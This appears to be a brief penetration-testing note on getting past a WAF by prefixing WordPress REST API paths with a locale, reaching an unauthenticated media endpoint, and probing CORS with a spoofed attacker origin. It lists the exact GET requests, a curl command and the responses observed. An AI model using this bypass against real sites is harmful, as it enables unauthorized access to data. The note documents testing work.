## Use case

The application exposed a media endpoint that allowed unauthenticated access, leading to significant information disclosure. This misconfiguration was compounded by a WAF bypass, allowing attackers to exploit the CORS policy and access sensitive data.

## Steps to test

1. Identify the target application with a WAF in place.
2. Test the canonical REST API path to confirm it is blocked (GET /wp-json/wp/v2/).
3. Test locale-prefixed paths to check for WAF bypass (GET /{locale}/wp-json/wp/v2/).
4. Access the media endpoint without authentication (GET /{locale}/wp-json/wp/v2/media).
5. Check the CORS headers by sending a request from an attacker-controlled origin and observe the Access-Control-Allow-Origin response.

## Commands

```text
GET /wp-json/wp/v2/ HTTP/1.1
GET /{locale}/wp-json/wp/v2/ HTTP/1.1
GET /{locale}/wp-json/wp/v2/media HTTP/1.1
curl -H 'Origin: https://attacker.example.com' -X GET 'https://target/{locale}/wp-json/wp/v2/media'
GET /wp-json/wp/v2/
GET /{locale}/wp-json/wp/v2/
GET /{locale}/wp-json/wp/v2/posts → 401 rest_auth_required
GET /{locale}/wp-json/wp/v2/pages → 401 rest_auth_required
GET /{locale}/wp-json/wp/v2/users → 401 rest_auth_required
GET /{locale}/wp-json/wp/v2/comments → 401 rest_auth_required
```
